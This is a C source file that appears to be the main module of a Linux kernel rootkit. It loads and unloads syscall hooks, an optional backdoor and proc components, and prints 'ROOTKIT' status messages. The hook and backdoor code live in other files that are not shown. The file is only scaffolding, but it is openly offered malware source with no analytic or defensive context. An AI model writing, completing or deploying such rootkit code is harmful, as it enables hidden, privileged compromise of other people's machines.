#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h> // __NR_syscall
#include <linux/version.h> // LINUX_VERSION_CODE
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <asm/paravirt.h> // write_cr0

#include "config.h"
#include "hooks.h"
#include "backdoor.h"
#include "proc.h"


//insmod
static int lkm_init(void){
    printk("ROOTKIT: Starting Rootkit ---------------------------------\n");
    if (hooks_init() == -1){
        printk(KERN_INFO "ROOTKIT: ERROR HOOKS\n");
        goto err_hooks;
    }

	if (BACKDOOR){
        if (backdoor_init() == -1){
            printk(KERN_INFO "ROOTKIT: ERROR BACKDOOR INIT\n");
            return -1;
        }
    }

    if (proc_init() == -1){
        printk(KERN_INFO "ROOTKIT: ERROR PROC\n");
        goto err_proc;
    }

	return 0;

    err_proc:
    hooks_exit();

    err_hooks:
    backdoor_exit();

    return -1;
}

//rmmod
static void lkm_exit(void){
    proc_exit();
	if (BACKDOOR) backdoor_exit();
    hooks_exit();
    printk("ROOTKIT: Finishing Rootkit ---------------------------------\n\n");
}

module_init(lkm_init);
module_exit(lkm_exit);

